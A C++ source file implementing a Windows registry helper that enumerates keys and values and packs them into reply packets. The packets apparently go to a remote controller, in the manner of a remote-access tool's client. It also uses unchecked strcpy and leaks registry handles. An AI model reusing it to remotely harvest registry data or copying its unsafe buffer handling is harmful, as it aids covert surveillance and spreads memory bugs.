#include "pch.h"
#include "RegisterHelper.h"
#include "Common.h"
#pragma warning(disable:4996)

CRegister::CRegister(char IsToken)
{
	switch (IsToken) {
	case MHKEY_CLASSES_ROOT:
		m_KeyHandle = HKEY_CLASSES_ROOT;
		break;
	case MHKEY_CURRENT_USER:
		m_KeyHandle = HKEY_CURRENT_USER;
		break;
	case MHKEY_LOCAL_MACHINE:
		m_KeyHandle = HKEY_LOCAL_MACHINE;
		break;
	case MHKEY_USERS:
		m_KeyHandle = HKEY_USERS;
		break;
	case MHKEY_CURRENT_CONFIG:
		m_KeyHandle = HKEY_CURRENT_CONFIG;
		break;
	default:
		m_KeyHandle = HKEY_LOCAL_MACHINE;
		break;
	}

	ZeroMemory(m_KeyPath, MAX_PATH);
}


CRegister::~CRegister()
{
}

void CRegister::SetPath(char* KeyPath)
{
	ZeroMemory(m_KeyPath, MAX_PATH);
	strcpy(m_KeyPath, KeyPath);
}



char* CRegister::FindPath()
{
	char* BufferData = NULL;
	HKEY   KeyHandle;			//注册表返回句柄
	/*打开注册表 */
	if (RegOpenKeyEx(m_KeyHandle, m_KeyPath, 0, KEY_ALL_ACCESS, &KeyHandle) == ERROR_SUCCESS)//打开
	{
		DWORD Index = 0, NameCount, NameMaxLength, Type;
		DWORD KeyLength, KeyCount, KeyMaxLength, DateSize, MaxDateLength;


		//这就是枚举了
		if (RegQueryInfoKey(KeyHandle, NULL, NULL, NULL, &KeyCount,
			&KeyMaxLength, NULL, &NameCount, &NameMaxLength, &MaxDateLength, NULL, NULL) != ERROR_SUCCESS)
		{

			return NULL;
		}
		//一点保护措施
		KeyLength = KeyMaxLength + 1;
		if (KeyCount > 0 && KeyLength > 1)
		{
			int v1 = sizeof(PACKET_HEADER) + 1;
			DWORD BufferLength = KeyCount * KeyLength + v1 + 1;


			//[CLIENT_REGISTER_MANAGER_PATH_DATA][2 11 ccccc\0][11][11]

			BufferData = (char*)LocalAlloc(LPTR, BufferLength);
			ZeroMemory(BufferData, BufferLength);
			BufferData[0] = CLIENT_REGISTER_MANAGER_PATH_DATA_REPLY;                //命令头

			PACKET_HEADER  PacketHeader;                     //数据头
			PacketHeader.nameCount = KeyCount;
			PacketHeader.nameSize = KeyLength;
			memcpy(BufferData + 1, (void*)&PacketHeader, v1);

			char* v2 = new char[KeyLength];
			for (Index = 0; Index < KeyCount; Index++)		//枚举项
			{
				ZeroMemory(v2, KeyLength);
				DWORD i = KeyLength;
				RegEnumKeyEx(KeyHandle, Index, v2, &i, NULL, NULL, NULL, NULL);
				strcpy(BufferData + Index * KeyLength + v1, v2);
			}
			delete[] v2;
			RegCloseKey(KeyHandle);

		}

	}

	return BufferData;
}
char* CRegister::FindKey()
{
	char* ValueName;			//键值名称
	char* KeyName;			//子键名称
	LPBYTE	ValueDate;		    //键值数据

	char* BufferData = NULL;
	HKEY  KeyHandle;			//注册表返回句柄
	if (RegOpenKeyEx(m_KeyHandle, m_KeyPath, 0, KEY_ALL_ACCESS, &KeyHandle) == ERROR_SUCCESS)//打开
	{
		DWORD Index = 0, NameCount, NameLength, NameMaxLength, Type;
		DWORD KeySize, KeyCount, KeyMaxLength, DataLength, MaxDateLength;
		//这就是枚举了
		if (RegQueryInfoKey(KeyHandle, NULL, NULL, NULL,
			&KeyCount, &KeyMaxLength, NULL, &NameCount, &NameMaxLength, &MaxDateLength, NULL, NULL) != ERROR_SUCCESS)
		{

			return NULL;
		}
		if (NameCount > 0 && MaxDateLength > 0 && NameMaxLength > 0)
		{
			DataLength = MaxDateLength + 1;
			NameLength = NameMaxLength + 100;
			PACKET_HEADER  PacketHeader;
			PacketHeader.nameCount = NameCount;        //总个数
			PacketHeader.nameSize = NameLength;          //名字大小
			PacketHeader.valueSize = DataLength;            //数据大小
			int v1 = sizeof(PACKET_HEADER);
			// 头                   标记            名字                数据
			DWORD BufferLength = sizeof(PACKET_HEADER) +
				sizeof(BYTE) * NameCount + NameLength * NameCount + DataLength * NameCount + 10;
			BufferData = (char*)LocalAlloc(LPTR, BufferLength);
			ZeroMemory(BufferData, BufferLength);

			BufferData[0] = CLIENT_REGISTER_MANAGER_KEY_DATA_REPLY;         //命令头
			memcpy(BufferData + 1, (void*)&PacketHeader, v1);     //数据头

			ValueName = (char*)malloc(NameLength);
			ValueDate = (LPBYTE)malloc(DataLength);

			char* Offset = BufferData + v1 + 1;
			for (Index = 0; Index < NameCount; Index++)	//枚举键值
			{
				ZeroMemory(ValueName, NameLength);
				ZeroMemory(ValueDate, DataLength);

				DataLength = MaxDateLength + 1;
				NameLength = NameMaxLength + 100;

				RegEnumValue(KeyHandle, Index, ValueName, &NameLength,
					NULL, &Type, ValueDate, &DataLength);//读取键值

				if (Type == REG_SZ)
				{
					Offset[0] = MREG_SZ;
				}
				if (Type == REG_DWORD)
				{

					Offset[0] = MREG_DWORD;
				}
				if (Type == REG_BINARY)
				{
					Offset[0] = MREG_BINARY;
				}
				if (Type == REG_EXPAND_SZ)
				{
					Offset[0] = MREG_EXPAND_SZ;
				}
				Offset += sizeof(BYTE);
				strcpy(Offset, ValueName);
				Offset += PacketHeader.nameSize;
				memcpy(Offset, ValueDate, PacketHeader.valueSize);
				Offset += PacketHeader.valueSize;
			}
			free(ValueName);
			free(ValueDate);

		}

	}
	return BufferData;
}

